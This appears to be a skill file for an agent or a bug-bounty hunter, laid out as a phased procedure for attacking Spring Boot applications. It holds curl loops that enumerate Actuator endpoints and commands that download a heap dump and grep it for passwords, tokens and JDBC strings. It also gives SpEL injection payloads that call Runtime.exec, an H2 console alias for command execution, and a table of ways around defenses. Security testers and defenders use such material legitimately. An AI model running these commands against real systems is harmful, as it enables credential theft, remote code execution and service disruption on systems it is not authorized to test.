---
name: hunt-springboot
description: Hunt Spring Boot specific vulnerabilities — Actuator endpoints (heapdump, env, loggers, mappings, shutdown), Spring Expression Language (SpEL) injection → RCE, H2 console RCE, Jolokia JMX exposure, Spring4Shell (CVE-2022-22965), heap dump credential extraction. Use when target runs Spring Boot — detected via X-Application-Context header, /actuator, Whitelabel Error Page.
sources: hackerone_public, cve_database, spring_security_advisories
report_count: 16
---

# HUNT-SPRINGBOOT — Spring Boot Specific Vulnerabilities

## Crown Jewel Targets
- **`/actuator/heapdump`** — full JVM heap dump = all secrets in memory
- **`/actuator/env`** — env vars + Spring properties including secrets
- **`/actuator/shutdown`** — POST → application shutdown
- **H2 Console (`/h2-console`)** — SQL admin UI → RCE via `CREATE ALIAS`
- **SpEL injection** → RCE
- **Spring4Shell (CVE-2022-22965)** — Spring < 5.3.18 + Tomcat → RCE

## Phase 1 — Fingerprint
```bash
curl -sI https://$TARGET/ | grep -i "x-application-context"
curl -s "https://$TARGET/nonexistent" | grep -i "Whitelabel Error Page\|Spring Boot"

for base in "" "/manage" "/management" "/app"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$base/actuator")
  [ "$STATUS" = "200" ] && echo "[+] Actuator at: $TARGET$base/actuator"
done
```

## Phase 2 — Actuator Endpoint Enumeration
```bash
BASE="https://$TARGET/actuator"
for ep in env heapdump threaddump mappings beans metrics loggers shutdown h2-console jolokia info health; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/$ep")
  [ "$STATUS" != "404" ] && [ "$STATUS" != "403" ] && echo "[$STATUS] $BASE/$ep"
done
```

## Phase 3 — Heapdump Credential Extraction
```bash
# Download heap dump (can be 100MB+)
curl -s "$BASE/heapdump" -o heapdump.hprof

# Extract secrets (can use jhat, Eclipse MAT, or strings)
strings heapdump.hprof | grep -E 'password|secret|token|key|jdbc:' | sort -u | head -50
```

## Phase 4 — SpEL Injection
```bash
# Test in common SpEL-processed parameters
curl -s "https://$TARGET/api/search?q=T(java.lang.Runtime).getRuntime().exec('id')"
curl -s "https://$TARGET/api/eval?input=T(java.lang.Runtime).getRuntime().exec('id')"
```

## Phase 5 — H2 Console RCE
```bash
# If /h2-console accessible:
# 1. Connect to the in-memory DB using JDBC URL: jdbc:h2:mem:testdb
# 2. Run: CREATE ALIAS IF NOT EXISTS EXEC AS 'String exec(String c) {Runtime rt = Runtime.getRuntime(); Process p = rt.exec(new String[]{"cmd", "/c", c}); ...}'
# 3. Call: CALL EXEC('whoami')
```

## Bypass Techniques
| Defense | Bypass |
|---|---|
| Actuator behind /manage | Check /manage/actuator and /management/actuator |
| heapdump 403 | Check if path uses .json: /actuator/heapdump.json |
| Actuator disabled | Try Spring Boot 1.x paths (/env, /beans, /dump) |
| H2 console disabled | Check /h2, /h2-console, /db, /console |

## Chain Table
| Finding | Impact |
|---------|--------|
| /actuator/heapdump | Critical — all secrets |
| /actuator/env with creds | High |
| /actuator/shutdown POST | High — availability |
| SpEL injection → RCE | Critical |
| H2 console → RCE | Critical |
| Spring4Shell → RCE | Critical |

## Related Skills
- **hunt-rce** — full exploit after SpEL/Spring4Shell confirmation
- **triage-validation** — 7-Question Gate
